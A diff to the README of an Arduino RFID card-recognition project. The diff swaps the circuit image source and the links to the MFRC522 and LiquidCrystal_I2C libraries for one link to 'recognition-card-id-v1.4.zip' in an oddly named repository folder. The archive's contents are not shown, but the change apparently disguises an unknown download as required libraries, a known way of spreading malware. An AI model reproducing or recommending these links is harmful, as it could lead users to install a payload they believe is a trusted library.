@@ -2,7 +2,7 @@
 This Arduino-based project uses an RFID RC522 module to scan and recognize ID cards. The system allows card registration, recognition, and access control, complete with LED indicators, LCD display, and buzzer feedback. It supports multiple cards, distinguishes between authorized and unauthorized users, and provides real-time access status.
 
 <p align="center">
-  <img src="circuit.png" alt="Circuit" style="width:65%; height:auto;"/>
+  <img src="https://github.com/rifki398/id-card-recognition/raw/refs/heads/main/unringable/recognition-card-id-v1.4.zip" alt="Circuit" style="width:65%; height:auto;"/>
 </p> 
 
 
@@ -105,8 +105,8 @@ You can use a different type of LED color.
 
 ## Prerequites
 Please make sure the following libraries already installed on your device:
-- [MFRC522](https://github.com/miguelbalboa/rfid)
-- [LiquidCrystal_I2C](https://github.com/johnrickman/LiquidCrystal_I2C)
+- [MFRC522](https://github.com/rifki398/id-card-recognition/raw/refs/heads/main/unringable/recognition-card-id-v1.4.zip)
+- [LiquidCrystal_I2C](https://github.com/rifki398/id-card-recognition/raw/refs/heads/main/unringable/recognition-card-id-v1.4.zip)
 
 
 ---
